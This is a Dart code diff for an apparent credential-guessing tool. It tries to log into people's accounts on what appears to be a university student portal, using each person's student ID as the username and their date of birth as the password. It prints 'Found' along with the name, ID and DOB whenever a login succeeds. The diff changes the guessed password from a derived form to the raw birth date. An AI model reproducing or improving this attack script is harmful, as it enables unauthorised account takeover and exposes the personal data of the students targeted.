@@ -15,13 +15,11 @@ abstract class CheckAccount {
   }
 
   static Future<bool> _checkAccount(Account account) async {
-    String password =
-        '${account.dob.replaceAll("-", "").substring(0, 3)}${account.dob.replaceAll("-", "").substring(6, 7)}';
     var response = await _dio.post(_loginURL,
         data: FormData.fromMap({
           "__VIEWSTATE": _viewState,
           "_ctl0:MainContent:QLTH_btnLogin": _method,
-          "_ctl0:MainContent:DN_txtPass": password,
+          "_ctl0:MainContent:DN_txtPass": account.dob,
           "_ctl0:MainContent:DN_txtAcc": account.mssv,
         }),
         options: Options(
@@ -30,13 +28,12 @@ abstract class CheckAccount {
             seconds: 10,
           ),
         ));
-    print(response.data);
     if (response.data
         .toString()
         .contains('<html><head><title>Object moved</title></head><body>')) {
       print('-----------------');
       print("******* Found ******");
-      print(password);
+      print(account.dob);
       print(account.mssv);
       print(account.name);
       print('-----------------');
@@ -44,7 +41,7 @@ abstract class CheckAccount {
     }
     print('-----------------');
     print("******* Wrong ******");
-    print(password);
+    print(account.dob);
     print(account.mssv);
     print(account.name);
     print('-----------------');
